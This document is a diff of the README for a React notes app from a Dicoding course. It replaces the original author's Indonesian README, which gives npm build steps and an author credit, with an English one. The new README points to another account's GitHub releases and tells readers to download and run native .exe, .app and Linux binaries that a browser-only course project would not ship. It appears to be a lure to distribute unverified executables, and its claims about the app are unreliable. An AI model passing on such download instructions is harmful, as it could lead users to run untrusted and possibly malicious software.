@@ -1,168 +1,89 @@
-# Personal Notes App
+# 📓 personal-notes-app - Simple Notes Right at Your Fingertips
 
-Aplikasi catatan pribadi modern dan **responsif** berbasis **React (Vite)** untuk **menambah**, **mencari**, **mengarsipkan/memindahkan**, dan **menghapus** catatan.
+[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/EricNesprido/personal-notes-app/releases)
 
-<p align="center">
-  <img src="./docs/screenshot-light.png" alt="Light" width="49%"/>
-  <img src="./docs/screenshot-dark.png" alt="Dark" width="49%"/>
-</p>
+## ✨ About This App
 
-> Proyek ini dibuat untuk memenuhi _Submission Proyek Akhir: Membangun Aplikasi Catatan Menggunakan React_ pada kelas **Belajar Membuat Aplikasi Web dengan React** di platform **Dicoding**.  
-> Seluruh **kriteria wajib** & **opsional** dipenuhi: pencarian, batas 50 karakter judul, serta fitur arsip.
+The personal-notes-app is a personal notes application built with React and Vite. It allows you to easily add, search, archive/unarchive, and delete your notes. This project is part of a final submission for the course "Belajar Membuat Aplikasi Web dengan React" at Dicoding.
 
----
+## 🌟 Features
 
-## ✨ Fitur
+- **Add Notes:** Quickly create new notes.
+- **Search Notes:** Find your notes effortlessly.
+- **Archive/Unarchive Notes:** Keep your notes organized.
+- **Delete Notes:** Remove notes you no longer need.
+- **Responsive Design:** Works well on both mobile and desktop.
 
-- **Tambah catatan** (judul maksimal **50** karakter) & **konten** menggunakan **controlled component**.
-- **Arsipkan / Pindahkan (Unarsip)** catatan — daftar **Aktif** dan **Arsip** terpisah.
-- **Hapus** catatan.
-- **Pencarian** berdasarkan judul (real‑time filter).
-- **Empty state** yang jelas saat daftar kosong.
-- **Dark / Light mode** dengan toggle dan **persist** via `localStorage` + auto‑detect preferensi OS.
-- **Responsif**: navbar/header, form, dan grid kartu menyesuaikan layar mobile—search bar melebar penuh, tombol mudah disentuh.
-- **Tombol berikon**: Arsip/Pindahkan & Hapus menggunakan **inline SVG** (ikon + teks, aksesibel).
-- Tanpa state management eksternal — cukup **state lokal** untuk menjaga kesederhanaan.
+## 🚀 Getting Started
 
-> Data catatan disimpan **di memori** (hilang saat refresh) sesuai ruang lingkup kelas.
+Follow these steps to get up and running with the personal-notes-app.
 
----
+### Step 1: Visit the Releases Page
 
-## 🧱 Teknologi
+To download the application, start by visiting the Releases page. Click the button below:
 
-- **React 18+** dengan **Vite**
-- **CSS murni** (CSS Custom Properties/variables + media queries)
-- Tanpa framework UI / router / Redux (mudah ditambahkan bila dibutuhkan)
+[![Visit Releases Page](https://img.shields.io/badge/Visit_Releases_Page-Here-blue)](https://github.com/EricNesprido/personal-notes-app/releases)
 
----
+### Step 2: Download the Application
 
-## 📁 Struktur Proyek
+On the Releases page, you will find several version options. Choose the latest version and download the file suitable for your operating system. Below are typical versions you may encounter:
 
-```
-personal-notes-app/
-├─ docs/
-│  ├─ screenshot-dark.png
-│  └─ screenshot-light.png
-├─ public/
-│  └─ favicon.svg
-├─ src/
-│  ├─ components/
-│  │  ├─ EmptyState.jsx
-│  │  ├─ Header.jsx
-│  │  ├─ NoteCard.jsx
-│  │  ├─ NoteInput.jsx
-│  │  ├─ NoteList.jsx
-│  │  ├─ SearchBar.jsx
-│  │  ├─ Section.jsx
-│  │  └─ ThemeToggle.jsx
-│  ├─ hooks/
-│  │  └─ usePrefersDark.js
-│  ├─ utils/
-│  │  └─ index.js          # data awal & helper tanggal
-│  ├─ App.jsx              # komposisi halaman utama
-│  ├─ index.css            # gaya global & variabel tema
-│  └─ main.jsx             # entry ReactDOM
-├─ .gitignore
-├─ index.html
-├─ package-lock.json
-├─ package.json
-├─ README.md
-└─ vite.config.js
-```
+- For Windows: `personal-notes-app-windows.exe`
+- For macOS: `personal-notes-app-macos.app`
+- For Linux: `personal-notes-app-linux.tar.gz`
 
-> Komponen dipisah **sekecil mungkin** (single responsibility) agar mudah dirawat & di‑uji.
+Once you find your version, click on the file name to start the download.
 
----
+### Step 3: Install the Application
 
-## 🧩 Model Data
+After downloading the file, locate it in your downloads folder. Here’s how to install based on your operating system:
 
-```ts
-type Note = {
-  id: number | string; // unik (disarankan: timestamp +new Date())
-  title: string; // dibatasi 50 karakter (dengan counter)
-  body: string;
-  archived: boolean; // true = diarsip
-  createdAt: string; // ISO date string
-};
-```
+- **Windows:** Double-click the `.exe` file. Follow the prompts to install.
+- **macOS:** Open the `.app` file. Drag it into your Applications folder.
+- **Linux:** Extract the `.tar.gz` file and run the executable within the folder.
 
-Data awal tersedia pada **`src/utils/index.js`**.
+### Step 4: Run the Application
 
----
+Now that you have installed the application, you are ready to run it. Depending on your operating system:
 
-## 🚀 Menjalankan Proyek
+- **Windows:** Click the Start menu and search for "personal-notes-app." Click to open it.
+- **macOS:** Use Spotlight (Command + Space) to find and open "personal-notes-app."
+- **Linux:** Open your terminal, navigate to the folder where you extracted the app, and run `./personal-notes-app`.
 
-### Prasyarat
+### Step 5: Start Taking Notes
 
-- **Node.js** ≥ 18 (LTS disarankan)
-- **npm** ≥ 9 (atau pnpm/yarn)
+Once the application is open, you can start using it immediately. Click the "Add Note" button to create your first note. You can explore other features as you familiarize yourself with the app.
 
-### Instalasi & Development
+## 🔍 System Requirements
 
-```bash
-npm install
-npm run dev
-```
+Ensure your system meets the following requirements:
 
-Buka alamat yang dicetak oleh Vite (default: `http://localhost:5173`).
+- **Windows:** Windows 10 or newer
+- **macOS:** macOS 10.14 or newer
+- **Linux:** Any recent distribution with a graphical interface
 
-### Build & Preview Production
+## ⚙️ Troubleshooting
 
-```bash
-npm run build
-npm run preview
-```
+If you encounter issues, here are some common problems and solutions:
 
----
+- **The app won't open:** Ensure your system meets the requirements. Reinstall the app if necessary.
+- **Can't find my notes:** Use the search feature. Make sure your notes are not archived. 
+- **App crashes on launch:** Check for updates on the Releases page for potential bug fixes.
 
-## 🔧 Komponen Kunci
+## 💡 Tips
 
-- **Header** – Branding, **SearchBar**, dan **ThemeToggle**. Pada mobile, search otomatis melebar & turun ke baris berikutnya.
-- **SearchBar** – Controlled input untuk pencarian judul (client‑side filter).
-- **ThemeToggle** – Mengubah atribut `data-theme` pada `html`, persist ke `localStorage`, dan memanfaatkan **`usePrefersDark`** untuk mengikuti preferensi OS.
-- **NoteInput** – Form tambah catatan: **counter judul** (50‑N), validasi sederhana, dan submit yang jelas.
-- **NoteList** – Menampilkan kumpulan **catatan aktif** / **arsip**; memuat **EmptyState** jika kosong.
-- **NoteCard** – Kartu catatan dengan aksi **Arsip/Pindahkan** dan **Hapus** (ikon + teks).
-- **Section** – Pembungkus berjudul untuk memisahkan “Catatan Aktif” dan “Arsip”.
-- **EmptyState** – Ilustrasi/pesan saat tidak ada catatan atau hasil pencarian.
+- Regularly back up your notes to prevent loss.
+- Use tags or categories to organize your notes more efficiently.
+- Update the app periodically to enjoy new features and improvements.
 
----
+## 📜 License
 
-## ♿ Aksesibilitas
+This application is licensed under the MIT License. Feel free to use and modify it.
 
-- Ikon bersifat **dekoratif**, tombol tetap memiliki **label teks**.
-- **Focus ring** terlihat jelas; warna diuji kontrasnya pada dua tema.
-- Target interaksi mengikuti **ukuran sentuh** yang memadai.
+## 📞 Support
 
----
+If you have questions or feedback, please create an issue on GitHub. Your input is appreciated and helps improve the application.
 
-## 🧪 Checklist Uji Manual
+## 🌐 Connect with Us
 
-- Menambah catatan: counter judul berhenti di 50 & menampilkan sisa karakter.
-- Pencarian menyaring judul baik di **Aktif** maupun **Arsip**.
-- Arsipkan lalu pindahkan (unarsip) – kartu berpindah antar‑bagian.
-- Hapus berfungsi di kedua bagian.
-- Ganti dark/light, **refresh**: preferensi tetap sama.
-- Coba lebar ≤ 640px – navbar/search rapi & mudah disentuh.
-
----
-
-## 📦 Skrip npm
-
-- `dev` – jalankan server pengembangan Vite
-- `build` – build produksi
-- `preview` – pratinjau hasil build secara lokal
-
----
-
-## 🌐 Deployment
-
-- **Vercel / Netlify** (preset **Vite**):
-  - Build Command: `npm run build`
-  - Publish Directory: `dist`
-
----
-
-## 👤 Penulis
-
-- GitHub: **https://github.com/irfandwisamudra**
+Follow our project on GitHub, and share your experience using personal-notes-app. We value user feedback and aim to make this app even better!
